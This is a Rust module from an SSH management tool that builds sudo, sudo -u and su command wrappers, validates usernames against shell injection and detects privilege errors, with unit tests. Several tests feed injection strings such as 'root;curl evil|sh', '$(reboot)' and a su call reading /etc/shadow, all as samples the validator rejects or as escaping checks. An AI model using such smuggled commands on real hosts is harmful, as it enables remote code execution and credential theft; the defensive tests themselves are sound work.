//! Privilege-escalation helpers shared across the right-side
//! panels.
//!
//! Pier-X runs every remote action through an unprivileged SSH
//! user. Some panels (Docker, firewall, nginx, web-server,
//! postgres) act on resources that are root-owned by default;
//! they need to wrap their commands in `sudo -S` and pipe a
//! password via stdin. This module is the single place that
//! knows the exact `sudo` invocation we use, and the single place
//! that knows what stderr looks like when a command was rejected
//! for lack of privilege — so detection and remediation stay in
//! sync as new error strings show up across distros.
//!
//! ## Why `sudo -S -p ''`
//!
//! * `-S` reads the password from stdin, so we never pass it on
//!   the command line where `/proc/<pid>/cmdline` would show it
//!   to any local user on the box.
//! * `-p ''` suppresses the prompt so the password we pipe in is
//!   the *only* thing on stdin — otherwise sudo emits a `[sudo]
//!   password for user:` prompt that gets merged into stdout and
//!   confuses parsers (Docker JSON parsing especially).
//! * Wrapping in `bash -c '...'` keeps the original command's
//!   shell semantics (pipes, &&, redirects) intact while we put a
//!   single-token executable (`sudo`) at the front. The wrapped
//!   command is single-quoted and any embedded `'` is escaped as
//!   `'\''` so user-supplied paths and image names round-trip
//!   safely.

/// Wrap `command` so it runs under `sudo -S` with the password
/// supplied on stdin. Returns `(wrapped_command, stdin_payload)`
/// where the stdin payload includes the trailing newline `sudo`
/// expects to consider the password complete.
///
/// The wrapper passes the original command verbatim through
/// `bash -c` so shell metacharacters (`|`, `&&`, `>`, …) keep
/// working. The single quotes around the inner command are
/// safety-escaped: every embedded `'` becomes `'\''`.
pub fn wrap_command(command: &str, password: &str) -> (String, String) {
    // sh -c needs the inner command single-quoted; escape any '
    // by closing-quoting, emitting a literal \', and re-opening.
    let escaped = command.replace('\'', r"'\''");
    // `LC_ALL=C` forces sudo's own diagnostics to ASCII English so
    // `is_elevation_auth_failure` matches on a localized (e.g. zh_CN)
    // host — otherwise a wrong-password failure reads `密码错误`, the
    // su fallback never fires, and the panel silently fails to elevate.
    let wrapped = format!("LC_ALL=C sudo -S -p '' bash -c '{escaped}'");
    let stdin = format!("{password}\n");
    (wrapped, stdin)
}

/// Wrap `command` so it runs under `su - <target_user> -c`, with the
/// target user's password piped on stdin. Returns `(wrapped_command,
/// stdin_payload)`. Defaults `target_user` to `root` when empty.
///
/// This is the `su` counterpart to [`wrap_command`], for hosts where
/// the operator escalated with a *root password* (`su`) rather than
/// being on the sudoers list. **Caveat:** the classic util-linux `su`
/// reads its password from `/dev/tty`, not stdin, so on most Linux
/// distros this only succeeds when run on a channel that has a PTY.
/// Callers should treat a "must be run from a terminal" failure
/// (see [`is_permission_denied`]) as "su path unavailable here" and
/// prefer the sudo path. Kept as a best-effort fallback for the
/// minority of environments whose `su`/PAM accepts a stdin password.
pub fn wrap_command_su(command: &str, target_user: &str, password: &str) -> (String, String) {
    let escaped = command.replace('\'', r"'\''");
    let user = if target_user.is_empty() {
        "root"
    } else {
        target_user
    };
    // Single-quote the username so a value carrying shell metacharacters can
    // never break out of the `su` token (defense in depth — callers should
    // already have validated via [`is_valid_username`]).
    let wrapped = format!("su - {} -c '{escaped}'", quote_user(user));
    let stdin = format!("{password}\n");
    (wrapped, stdin)
}

/// Wrap `command` so it runs under `sudo -S -u <target_user>`, with the
/// caller's password piped on stdin. Returns `(wrapped_command,
/// stdin_payload)`. Defaults `target_user` to `root` when empty.
///
/// This is the `-u` counterpart to [`wrap_command`] — used to "become a
/// specific user" (following the terminal's effective user) while still
/// reading the password from stdin, so it works on a no-PTY exec
/// channel where [`wrap_command_su`] would fail.
pub fn wrap_command_sudo_u(command: &str, target_user: &str, password: &str) -> (String, String) {
    let escaped = command.replace('\'', r"'\''");
    let user = if target_user.is_empty() {
        "root"
    } else {
        target_user
    };
    // See [`wrap_command`] re: `LC_ALL=C` — keep sudo's diagnostics
    // ASCII so the auth-failure fallback fires on localized hosts.
    // The username is single-quoted as defense in depth (see
    // [`wrap_command_su`]).
    let wrapped = format!(
        "LC_ALL=C sudo -S -p '' -u {} bash -c '{escaped}'",
        quote_user(user)
    );
    let stdin = format!("{password}\n");
    (wrapped, stdin)
}

/// Build a **passwordless** sudo wrapper (`sudo -n`) for `command`,
/// honoring the elevation method. Returns `None` for methods that can't
/// run non-interactively without a secret — [`Elevation::None`] (nothing
/// to do) and [`Elevation::Su`] (util-linux `su` always needs a password
/// on a tty). Used to follow a terminal that elevated on a NOPASSWD /
/// cached-credentials host: we captured no secret, but `sudo -n` still
/// succeeds there and fails fast (no prompt, no hang) everywhere else, so
/// the caller can cleanly degrade to an unprivileged run.
///
/// `LC_ALL=C` keeps the "a password is required" diagnostic ASCII so the
/// caller's [`is_elevation_auth_failure`] check fires on localized hosts.
pub fn wrap_command_nopasswd(command: &str, elevation: &Elevation) -> Option<String> {
    let escaped = command.replace('\'', r"'\''");
    match elevation {
        Elevation::Sudo => Some(format!("LC_ALL=C sudo -n bash -c '{escaped}'")),
        Elevation::SudoUser { target_user } => {
            let user = if target_user.is_empty() {
                "root"
            } else {
                target_user
            };
            Some(format!(
                "LC_ALL=C sudo -n -u {} bash -c '{escaped}'",
                quote_user(user)
            ))
        }
        Elevation::None | Elevation::Su { .. } => None,
    }
}

/// True when `user` is a syntactically valid POSIX-ish username that is
/// safe to splice into a `su`/`sudo -u` command. Requires a leading letter
/// or `_`, then letters/digits/`_`/`-` (a single trailing `$` is allowed
/// for Samba machine accounts), capped at 32 chars. Anything with a shell
/// metacharacter, whitespace, leading `-` (which would be parsed as an
/// option), or other oddity is rejected so it can never reach the elevated
/// shell string. Also used at the Tauri command boundary
/// (`ssh_set_host_effective_user`).
pub fn is_valid_username(user: &str) -> bool {
    let bytes = user.as_bytes();
    if bytes.is_empty() || bytes.len() > 32 {
        return false;
    }
    let first = bytes[0];
    if !(first.is_ascii_alphabetic() || first == b'_') {
        return false;
    }
    bytes.iter().enumerate().all(|(i, &b)| {
        b.is_ascii_alphanumeric() || b == b'_' || b == b'-' || (b == b'$' && i == bytes.len() - 1)
    })
}

/// Single-quote a username for safe inclusion in a `su`/`sudo` shell
/// string, escaping any embedded `'` the same way the wrapped command is
/// escaped. Belt-and-suspenders on top of [`is_valid_username`] validation
/// at the call boundaries.
pub(crate) fn quote_user(user: &str) -> String {
    format!("'{}'", user.replace('\'', r"'\''"))
}

/// Privilege-escalation method for a *single* remote command. Decided
/// per-call and passed alongside the command rather than stored on the
/// session, so two panels sharing one SSH connection can run at
/// different privilege levels without clobbering a shared mutable slot.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub enum Elevation {
    /// Run as the SSH login user — no wrapping.
    #[default]
    None,
    /// `sudo -S` (become root with the caller's own login password).
    Sudo,
    /// `sudo -S -u <target_user>` (become a specific user). The primary
    /// way to "follow the terminal's effective user" — `sudo` reads the
    /// password from stdin, so it works on a no-PTY exec channel.
    SudoUser {
        /// User to become.
        target_user: String,
    },
    /// `su - <target_user> -c` with the target user's password. Fallback
    /// only — util-linux `su` reads from `/dev/tty`, so this usually
    /// fails on a no-PTY exec channel (see [`wrap_command_su`]).
    Su {
        /// User to become (usually `root`).
        target_user: String,
    },
}

impl Elevation {
    /// Parse the wire form used by the Tauri command layer:
    /// `"none"` / `"sudo"` / `"sudo-u"` / `"su"`. Unknown → `None`.
    pub fn from_wire(method: &str, target_user: Option<&str>) -> Self {
        match method {
            "sudo" => Elevation::Sudo,
            "sudo-u" => Self::become_specific_user(target_user.unwrap_or("root"), false),
            "su" => Self::become_specific_user(target_user.unwrap_or("root"), true),
            _ => Elevation::None,
        }
    }

    /// Build a `SudoUser`/`Su` elevation for `user`, **failing closed** when
    /// the username is not a valid POSIX username. Refusing rather than
    /// splicing an injection-prone value into a root shell means a bad value
    /// runs the action unprivileged (surfacing a normal permission error)
    /// instead of becoming command injection. `root`/empty collapses to the
    /// most-compatible plain `sudo`/`su -`.
    fn become_specific_user(user: &str, su: bool) -> Self {
        if user.is_empty() || user == "root" {
            return if su {
                Elevation::Su {
                    target_user: "root".to_string(),
                }
            } else {
                Elevation::Sudo
            };
        }
        if !is_valid_username(user) {
            return Elevation::None;
        }
        if su {
            Elevation::Su {
                target_user: user.to_string(),
            }
        } else {
            Elevation::SudoUser {
                target_user: user.to_string(),
            }
        }
    }

    /// Build the elevation that "becomes `target_user`" via sudo — the
    /// canonical mapping for following the terminal's effective user.
    /// `root` collapses to plain [`Elevation::Sudo`] (most compatible);
    /// any other user uses [`Elevation::SudoUser`].
    pub fn become_user_via_sudo(target_user: &str) -> Self {
        Self::become_specific_user(target_user, false)
    }

    /// True when this method needs a password secret to function.
    pub fn needs_secret(&self) -> bool {
        !matches!(self, Elevation::None)
    }
}

/// Best-effort detection of "this command failed because the
/// caller lacks privilege". Used by panels to decide whether to
/// pop the sudo password dialog and retry. False positives are
/// preferable to false negatives here — a spurious dialog the
/// user can cancel is fine; a silently-cryptic permission error
/// is the bug we're trying to fix.
///
/// The patterns cover (a) generic POSIX permission strings, (b)
/// Docker daemon socket EACCES, (c) iptables / nftables rule
/// loading, (d) systemctl + nginx reload, (e) cap-net-bind-style
/// "Operation not permitted".
pub fn is_permission_denied(output: &str) -> bool {
    let lower = output.to_lowercase();
    // Generic POSIX
    lower.contains("permission denied")
        // sudo refusing to run because the caller isn't on the
        // sudoers list — we still want to surface the prompt; the
        // user can decide whether to retry.
        || lower.contains("is not in the sudoers file")
        || lower.contains("a password is required")
        // Docker daemon socket
        || lower.contains("connect: permission denied")
        || lower.contains("got permission denied while trying to connect to the docker daemon socket")
        // systemctl / dbus
        || lower.contains("interactive authentication required")
        || lower.contains("authentication is required")
        // iptables / firewall
        || lower.contains("you must be root")
        || lower.contains("operation not permitted")
        // sudo/su refusing to run without a controlling terminal
        // (RHEL/CentOS `Defaults requiretty`, or `su` over a no-PTY
        // exec channel). Surfacing these as "needs elevation" lets the
        // caller re-prompt / fall back rather than treat them as an
        // opaque failure.
        || lower.contains("must be run from a terminal")
        || lower.contains("you must have a tty to run sudo")
        || lower.contains("a terminal is required")
        || lower.contains("sorry, you must have a tty")
        // generic EACCES / EPERM message
        || lower.contains("eacces")
        || lower.contains("eperm")
}

/// Detect that an elevation attempt failed at the **auth/authorization**
/// stage specifically (wrong password, not a sudoer, needs a tty) — as
/// opposed to the elevated command itself failing. Used by
/// [`crate::ssh::SshSession::exec_as_effective`] to decide whether to
/// fall back from `sudo` to `su` with the same secret: the classic case
/// is the operator having `su`'d in the terminal (so the captured secret
/// is the *root* password, which `sudo` rejects but `su` accepts).
pub fn is_elevation_auth_failure(output: &str) -> bool {
    let l = output.to_lowercase();
    l.contains("incorrect password")
        || l.contains("sorry, try again")
        || l.contains("authentication failure")
        || l.contains("authentication failed")
        || l.contains("is not in the sudoers")
        || l.contains("a password is required")
        || l.contains("must be run from a terminal")
        || l.contains("you must have a tty")
        || l.contains("must have a tty")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_elevation_auth_failure() {
        assert!(is_elevation_auth_failure(
            "sudo: 3 incorrect password attempts"
        ));
        assert!(is_elevation_auth_failure("Sorry, try again."));
        assert!(is_elevation_auth_failure(
            "chenqi is not in the sudoers file."
        ));
        assert!(is_elevation_auth_failure("sudo: a password is required"));
        // An inner command failing for an unrelated reason must NOT count
        // (otherwise we'd wrongly retry via su).
        assert!(!is_elevation_auth_failure(
            "find: '/x': No such file or directory"
        ));
    }

    #[test]
    fn wraps_simple_command() {
        let (cmd, stdin) = wrap_command("docker ps", "hunter2");
        assert_eq!(cmd, "LC_ALL=C sudo -S -p '' bash -c 'docker ps'");
        assert_eq!(stdin, "hunter2\n");
    }

    #[test]
    fn wraps_command_with_single_quotes() {
        let (cmd, _) = wrap_command("echo 'hi'", "pw");
        // ' becomes '\''
        assert_eq!(cmd, r"LC_ALL=C sudo -S -p '' bash -c 'echo '\''hi'\'''");
    }

    #[test]
    fn detects_docker_socket_eacces() {
        assert!(is_permission_denied(
            "Got permission denied while trying to connect to the Docker daemon socket"
        ));
    }

    #[test]
    fn detects_generic_permission_denied() {
        assert!(is_permission_denied("/etc/foo: permission denied"));
    }

    #[test]
    fn detects_systemctl_polkit() {
        assert!(is_permission_denied("Interactive authentication required."));
    }

    #[test]
    fn does_not_flag_unrelated_errors() {
        assert!(!is_permission_denied("No such file or directory"));
        assert!(!is_permission_denied("Container not found"));
    }

    #[test]
    fn detects_requiretty_and_su_tty() {
        assert!(is_permission_denied(
            "sudo: sorry, you must have a tty to run sudo"
        ));
        assert!(is_permission_denied("su: must be run from a terminal"));
        assert!(is_permission_denied(
            "a terminal is required to read the password"
        ));
    }

    #[test]
    fn su_wraps_with_target_user() {
        let (cmd, stdin) = wrap_command_su("cat /etc/shadow", "root", "pw");
        assert_eq!(cmd, "su - 'root' -c 'cat /etc/shadow'");
        assert_eq!(stdin, "pw\n");
    }

    #[test]
    fn su_defaults_to_root_when_empty() {
        let (cmd, _) = wrap_command_su("id", "", "pw");
        assert_eq!(cmd, "su - 'root' -c 'id'");
    }

    #[test]
    fn su_escapes_single_quotes() {
        let (cmd, _) = wrap_command_su("echo 'hi'", "admin", "pw");
        assert_eq!(cmd, r"su - 'admin' -c 'echo '\''hi'\'''");
    }

    #[test]
    fn username_validation_rejects_injection() {
        assert!(is_valid_username("postgres"));
        assert!(is_valid_username("deploy_1"));
        assert!(is_valid_username("_svc"));
        assert!(is_valid_username("web-app"));
        assert!(!is_valid_username(""));
        assert!(!is_valid_username("-i")); // leading dash → sudo/su option
        assert!(!is_valid_username("root;curl evil|sh"));
        assert!(!is_valid_username("a b"));
        assert!(!is_valid_username("x -c id;#"));
        assert!(!is_valid_username("$(reboot)"));
        assert!(!is_valid_username(&"a".repeat(33)));
    }

    #[test]
    fn elevation_fails_closed_on_bad_username() {
        // A username with shell metacharacters must NOT build an elevation
        // that would splice it into a root shell.
        assert_eq!(
            Elevation::from_wire("sudo-u", Some("postgres bash -c 'curl evil|sh' #")),
            Elevation::None
        );
        assert_eq!(Elevation::from_wire("su", Some("-i")), Elevation::None);
        assert_eq!(Elevation::become_user_via_sudo("root;id"), Elevation::None);
        // Valid users still work.
        assert_eq!(
            Elevation::become_user_via_sudo("postgres"),
            Elevation::SudoUser {
                target_user: "postgres".into()
            }
        );
    }

    #[test]
    fn elevation_from_wire_round_trips() {
        assert_eq!(Elevation::from_wire("none", None), Elevation::None);
        assert_eq!(Elevation::from_wire("sudo", None), Elevation::Sudo);
        assert_eq!(
            Elevation::from_wire("su", Some("deploy")),
            Elevation::Su {
                target_user: "deploy".to_string()
            }
        );
        // Unknown method falls back to None; su without a user defaults root.
        assert_eq!(Elevation::from_wire("bogus", None), Elevation::None);
        assert_eq!(
            Elevation::from_wire("su", None),
            Elevation::Su {
                target_user: "root".to_string()
            }
        );
    }

    #[test]
    fn elevation_needs_secret() {
        assert!(!Elevation::None.needs_secret());
        assert!(Elevation::Sudo.needs_secret());
        assert!(Elevation::SudoUser {
            target_user: "deploy".into()
        }
        .needs_secret());
        assert!(Elevation::Su {
            target_user: "root".into()
        }
        .needs_secret());
    }

    #[test]
    fn sudo_u_wraps_with_target_user() {
        let (cmd, stdin) = wrap_command_sudo_u("psql -c 'select 1'", "postgres", "pw");
        assert_eq!(
            cmd,
            r"LC_ALL=C sudo -S -p '' -u 'postgres' bash -c 'psql -c '\''select 1'\'''"
        );
        assert_eq!(stdin, "pw\n");
    }

    #[test]
    fn sudo_u_defaults_to_root_when_empty() {
        let (cmd, _) = wrap_command_sudo_u("id", "", "pw");
        assert_eq!(cmd, "LC_ALL=C sudo -S -p '' -u 'root' bash -c 'id'");
    }

    #[test]
    fn nopasswd_wraps_sudo_and_sudo_u_but_not_none_or_su() {
        assert_eq!(
            wrap_command_nopasswd("id", &Elevation::Sudo).as_deref(),
            Some("LC_ALL=C sudo -n bash -c 'id'")
        );
        assert_eq!(
            wrap_command_nopasswd(
                "id",
                &Elevation::SudoUser {
                    target_user: "postgres".into()
                }
            )
            .as_deref(),
            Some("LC_ALL=C sudo -n -u 'postgres' bash -c 'id'")
        );
        // Passwordless escalation is impossible for these methods.
        assert!(wrap_command_nopasswd("id", &Elevation::None).is_none());
        assert!(wrap_command_nopasswd(
            "id",
            &Elevation::Su {
                target_user: "root".into()
            }
        )
        .is_none());
    }

    #[test]
    fn become_user_via_sudo_maps_root_to_plain_sudo() {
        assert_eq!(Elevation::become_user_via_sudo("root"), Elevation::Sudo);
        assert_eq!(Elevation::become_user_via_sudo(""), Elevation::Sudo);
        assert_eq!(
            Elevation::become_user_via_sudo("deploy"),
            Elevation::SudoUser {
                target_user: "deploy".into()
            }
        );
    }

    #[test]
    fn from_wire_handles_sudo_u() {
        assert_eq!(
            Elevation::from_wire("sudo-u", Some("deploy")),
            Elevation::SudoUser {
                target_user: "deploy".into()
            }
        );
        // `sudo -u root` collapses to plain `sudo` (most compatible).
        assert_eq!(Elevation::from_wire("sudo-u", None), Elevation::Sudo);
    }
}
